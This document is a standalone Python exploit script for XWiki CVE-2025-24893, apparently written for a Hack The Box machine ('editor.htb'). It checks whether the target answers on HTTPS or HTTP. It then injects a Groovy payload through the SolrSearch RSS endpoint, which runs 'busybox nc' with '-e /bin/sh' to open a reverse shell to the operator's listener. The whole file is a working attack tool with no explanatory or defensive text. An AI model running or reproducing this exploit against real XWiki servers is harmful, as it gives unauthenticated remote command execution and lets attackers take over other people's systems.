#!/usr/bin/env python3
##
##
import requests
import urllib.parse
import sys
import argparse

def detect_protocol(domain):
    https_url = f"https://{domain}"
    http_url = f"http://{domain}"

    try:
        response = requests.get(https_url, timeout=5)
        if response.status_code < 400:
            print(f"[✔] HTTPS supported: {https_url}")
            return https_url
    except requests.RequestException:
        print("[!] HTTPS not available, trying HTTP...")

    try:
        response = requests.get(http_url, timeout=5)
        if response.status_code < 400:
            print(f"[✔] HTTP supported: {http_url}")
            return http_url
    except requests.RequestException:
        print("[✖] Could not reach the target.")
        sys.exit(1)

def build_busybox_payload(lhost, lport):
    cmd = f"busybox nc {lhost} {lport} -e /bin/sh"
    return f'{{{{async async=false}}}}{{{{groovy}}}}"{cmd}".execute(){{{{/groovy}}}}{{{{/async}}}}'

def send_payload(target_url, payload, lport):
    encoded = urllib.parse.quote(payload)
    full_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text={encoded}"

    print(f"[+] Sending payload to: {full_url}")
    try:
        response = requests.get(full_url, timeout=5)
        print(f"[✔] Payload sent. Check your listener on port {lport}.")
        print(f"[→] Response status: {response.status_code}")
    except requests.RequestException as e:
        print(f"[!] Request error: {e}")

def main():
    parser = argparse.ArgumentParser(description="XWiki CVE-2025-24893 - Reverse Shell (BusyBox)")
    parser.add_argument("-t", "--target", required=True, help="Target host (e.g. editor.htb:8080/xwiki)")
    parser.add_argument("-l", "--lhost", required=True, help="Your IP address for reverse shell")
    parser.add_argument("-p", "--lport", required=True, help="Port to receive the reverse shell")

    args = parser.parse_args()

    print("=" * 80)
    print("XWiki CVE-2025-24893 - Reverse Shell via Groovy (BusyBox Payload)")
    print("=" * 80)

    target_url = detect_protocol(args.target)
    payload = build_busybox_payload(args.lhost, args.lport)
    send_payload(target_url, payload, args.lport)

if __name__ == "__main__":
    main()

##
##
